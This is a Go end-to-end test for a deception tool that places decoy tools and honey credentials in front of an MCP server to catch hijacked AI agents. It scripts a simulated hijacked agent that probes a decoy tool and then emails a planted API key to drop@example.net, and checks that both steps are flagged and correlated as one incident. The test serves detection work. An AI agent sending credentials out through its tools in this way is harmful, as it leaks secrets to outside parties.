package server

// End-to-end test for the M6 exit criterion (docs/M6-gateway.md): the gateway in front of a
// scripted MCP server with real tools, talking to a real Snare server. An injected decoy
// call and a honey key sent through a real tool are both touches, with the layer and one
// session id, and the real tool still receives its call unchanged.
//
// It also covers the M7 exit criterion (docs/M7-incidents.md): the two touches form one
// incident with stages recon, exfiltration; the egress touch is Critical on its own; and the
// dashboard timeline shows both.

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/danielguillaumont/snare/internal/admin"
	"github.com/danielguillaumont/snare/internal/gateway"
	"github.com/danielguillaumont/snare/internal/plant"
	"github.com/danielguillaumont/snare/internal/store"
)

// realServer is a minimal MCP server with two real tools. It records every line it gets.
func realServer(in io.Reader, out io.WriteCloser, got chan<- string) {
	defer out.Close()
	sc := bufio.NewScanner(in)
	sc.Buffer(make([]byte, 64<<10), 4<<20)
	for sc.Scan() {
		line := sc.Text()
		got <- line
		var m struct {
			ID     json.RawMessage `json:"id"`
			Method string          `json:"method"`
		}
		if json.Unmarshal([]byte(line), &m) != nil || len(m.ID) == 0 {
			continue
		}
		var result any
		switch m.Method {
		case "tools/list":
			result = map[string]any{"tools": []map[string]any{
				{"name": "send_email", "description": "Send an email.", "inputSchema": map[string]any{"type": "object"}},
				{"name": "read_file", "description": "Read a file.", "inputSchema": map[string]any{"type": "object"}},
			}}
		case "tools/call":
			result = map[string]any{"content": []map[string]any{{"type": "text", "text": "done"}}}
		default:
			result = map[string]any{}
		}
		b, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": m.ID, "result": result})
		_, _ = out.Write(append(b, '\n'))
	}
}

func TestEndToEndGateway(t *testing.T) {
	cfg := Config{
		Key:       bytes.Repeat([]byte{8}, 32),
		AdminKey:  []byte("test-admin-key-0123456789abcdef"),
		HTTPAddr:  "127.0.0.1:0",
		AdminAddr: "127.0.0.1:0",
		PublicURL: "http://cb.test",
		DBPath:    filepath.Join(t.TempDir(), "snare.db"),

		DashboardAddr: "127.0.0.1:0",
		DashboardDev:  true,
	}
	s, err := Start(cfg, slog.New(slog.NewTextHandler(io.Discard, nil)))
	if err != nil {
		t.Fatal(err)
	}
	defer s.Shutdown(context.Background())
	c := &admin.Client{BaseURL: "http://" + s.AdminAddr, Key: string(cfg.AdminKey)}

	// A honey key planted earlier, somewhere the agent can read it.
	honey, err := c.Mint("honey_credential", "payments-api .env: PAYMENTS_API_KEY", "")
	if err != nil {
		t.Fatal(err)
	}
	gwPath := filepath.Join(t.TempDir(), "gw.json")
	if _, _, err := plant.Gateway(c, plant.GatewayOptions{ConfigPath: gwPath, Seed: 3}); err != nil {
		t.Fatal(err)
	}
	gcfg, err := gateway.LoadConfig(gwPath)
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := json.Marshal(gcfg)
	if bytes.Contains(raw, []byte(honey.Token)) || bytes.Contains(raw, cfg.Key) {
		t.Fatal("gateway config contains the honey key or the signing key")
	}
	gcfg.CallbackURL = "http://" + s.HTTPAddr // the public URL is cb.test; reach the listener directly

	cIn, toGW := io.Pipe()
	fromGW, cOut := io.Pipe()
	sIn, toSrv := io.Pipe()
	fromSrv, sOut := io.Pipe()
	got := make(chan string, 16)
	go realServer(sIn, sOut, got)
	g := &gateway.Gateway{Cfg: gcfg}
	go func() { _ = g.Run(context.Background(), cIn, cOut, toSrv, fromSrv) }()
	defer toGW.Close()
	replies := bufio.NewReader(fromGW)
	send := func(l string) { _, _ = io.WriteString(toGW, l+"\n") }
	read := func() string {
		l, err := replies.ReadString('\n')
		if err != nil {
			t.Fatal(err)
		}
		return l
	}

	// 1. The tool list now has decoys, named like the real (snake_case) tools.
	send(`{"jsonrpc":"2.0","id":1,"method":"tools/list"}`)
	<-got
	var list struct {
		Result struct {
			Tools []struct {
				Name string `json:"name"`
			} `json:"tools"`
		} `json:"result"`
	}
	if err := json.Unmarshal([]byte(read()), &list); err != nil {
		t.Fatal(err)
	}
	var decoy string
	for _, tl := range list.Result.Tools {
		if tl.Name != "send_email" && tl.Name != "read_file" {
			decoy = tl.Name
			if strings.ContainsAny(tl.Name, "-") || strings.ToLower(tl.Name) != tl.Name {
				t.Errorf("decoy %q doesn't follow the server's snake_case style", tl.Name)
			}
		}
	}
	if decoy == "" || len(list.Result.Tools) < 10 {
		t.Fatalf("no decoys injected: %+v", list.Result.Tools)
	}

	// 2. The hijacked agent calls a decoy: answered by the gateway, never reaches the server.
	send(`{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"` + decoy + `","arguments":{}}}`)
	if r := read(); !strings.Contains(r, "accepted") {
		t.Fatalf("decoy reply: %s", r)
	}
	// The gateway reports touches asynchronously, so wait for this one to land before the
	// next call; otherwise the two callbacks may arrive in either order.
	for deadline := time.Now().Add(5 * time.Second); ; time.Sleep(50 * time.Millisecond) {
		if ins, _ := c.Incidents(1); len(ins) == 1 {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("decoy call not recorded")
		}
	}

	// 3. It then emails the honey key out through a real tool.
	leak := `{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"drop@example.net","body":"key: ` + honey.Token + `"}}}`
	send(leak)
	if l := <-got; l != leak {
		t.Fatalf("real tool got an altered call:\n%s", l)
	}
	read()

	// Both touches arrive, with their layer and the same session.
	sessionRE := regexp.MustCompile(`session=(s[0-9a-f]{12})`)
	wait := func(tokenID, layer string) store.Event {
		t.Helper()
		deadline := time.Now().Add(5 * time.Second)
		for {
			evs, err := c.Events(tokenID, 10)
			if err != nil {
				t.Fatal(err)
			}
			for _, e := range evs {
				if strings.Contains(e.Detail, "layer="+layer) && sessionRE.MatchString(e.Detail) {
					return e
				}
			}
			if time.Now().After(deadline) {
				t.Fatalf("no %s touch on %s: %+v", layer, tokenID, evs)
			}
			time.Sleep(50 * time.Millisecond)
		}
	}
	egress := wait(honey.ID, "egress")
	if !strings.Contains(egress.Detail, "tool=send_email") || strings.Contains(egress.Detail, "drop@example.net") {
		t.Errorf("egress detail: %q", egress.Detail)
	}
	toks, _ := c.Tokens()
	var decoyID string
	for _, tk := range toks {
		if tk.Kind == "decoy_tool" {
			if evs, _ := c.Events(tk.ID, 5); len(evs) > 0 {
				decoyID = tk.ID
			}
		}
	}
	if decoyID == "" {
		t.Fatal("no decoy tripwire recorded a touch")
	}
	tool := wait(decoyID, "tool")
	session := sessionRE.FindStringSubmatch(egress.Detail)[1]
	if b := sessionRE.FindStringSubmatch(tool.Detail)[1]; session != b {
		t.Errorf("touches from one gateway session carry different ids: %s vs %s", session, b)
	}

	// M7: one incident, the decoy call then the leak, keyed by the gateway session.
	if tool.Stage != store.StageRecon || egress.Stage != store.StageExfiltration || egress.Layer != store.LayerEgress ||
		egress.Session != session || egress.IncidentID == 0 || egress.IncidentID != tool.IncidentID {
		t.Fatalf("stages and incident: tool %+v, egress %+v", tool, egress)
	}
	ins, err := c.Incidents(10)
	if err != nil || len(ins) != 1 {
		t.Fatalf("incidents: %+v %v", ins, err)
	}
	if in := ins[0]; in.ID != tool.IncidentID || in.Session != session || in.Touches != 2 || in.Tripwires != 2 ||
		strings.Join(in.Stages, ",") != "recon,exfiltration" {
		t.Fatalf("incident: %+v", in)
	}

	// The egress touch is Critical, and says why; the alert carries the incident.
	req, _ := http.NewRequest("GET", "http://"+s.AdminAddr+"/api/events/export", nil)
	req.Header.Set("Authorization", "Bearer "+string(cfg.AdminKey))
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	dec := json.NewDecoder(res.Body)
	var exported int
	for dec.More() {
		var a struct {
			SeverityID int `json:"severity_id"`
			Unmapped   struct {
				EventID         int64    `json:"event_id"`
				Stage           string   `json:"stage"`
				IncidentID      int64    `json:"incident_id"`
				SessionID       string   `json:"session_id"`
				Stages          []string `json:"correlated_stages"`
				CriticalBecause string   `json:"critical_because"`
			} `json:"unmapped"`
		}
		if err := dec.Decode(&a); err != nil {
			t.Fatal(err)
		}
		exported++
		u := a.Unmapped
		if u.IncidentID != egress.IncidentID || u.SessionID != session {
			t.Errorf("exported finding %d: incident %d session %q", u.EventID, u.IncidentID, u.SessionID)
		}
		if u.EventID == egress.ID && (a.SeverityID != 5 || u.Stage != "exfiltration" || u.CriticalBecause == "" ||
			strings.Join(u.Stages, ",") != "recon,exfiltration") {
			t.Errorf("egress finding: severity %d %+v", a.SeverityID, u)
		}
	}
	res.Body.Close()
	if exported != 2 {
		t.Fatalf("exported %d findings, want 2", exported)
	}

	// The dashboard timeline shows both touches with their stages, in order.
	op := &admin.Client{BaseURL: c.BaseURL, Key: c.Key}
	viewer, err := op.IssueKey(store.DefaultTenant, store.RoleViewer)
	if err != nil {
		t.Fatal(err)
	}
	page := dashboardPage(t, "http://"+s.DashboardAddr, viewer.Key, fmt.Sprintf("/incidents/%d", egress.IncidentID))
	recon, exfil := strings.Index(page, ">recon<"), strings.Index(page, ">exfiltration<")
	if !strings.Contains(page, "Incident #") || !strings.Contains(page, session) || recon < 0 || exfil < 0 {
		t.Fatalf("incident page lacks the session or a stage:\n%s", page)
	}
	if tl := strings.Index(page, "Timeline"); tl < 0 || strings.Index(page[tl:], ">recon<") > strings.Index(page[tl:], ">exfiltration<") {
		t.Errorf("timeline not in time order")
	}
}

// dashboardPage signs in to the dashboard with key and returns the page at path.
func dashboardPage(t *testing.T, base, key, path string) string {
	t.Helper()
	jar, _ := cookiejar.New(nil)
	hc := &http.Client{Jar: jar, Timeout: 5 * time.Second}
	res, err := hc.Get(base + "/login")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(res.Body)
	res.Body.Close()
	m := regexp.MustCompile(`name="csrf" value="([^"]+)"`).FindSubmatch(body)
	if m == nil {
		t.Fatal("login page has no csrf field")
	}
	res, err = hc.PostForm(base+"/login", url.Values{"csrf": {string(m[1])}, "key": {key}})
	if err != nil {
		t.Fatal(err)
	}
	res.Body.Close()
	res, err = hc.Get(base + path)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()
	body, _ = io.ReadAll(res.Body)
	if res.StatusCode != 200 {
		t.Fatalf("GET %s: %d %s", path, res.StatusCode, body)
	}
	return string(body)
}
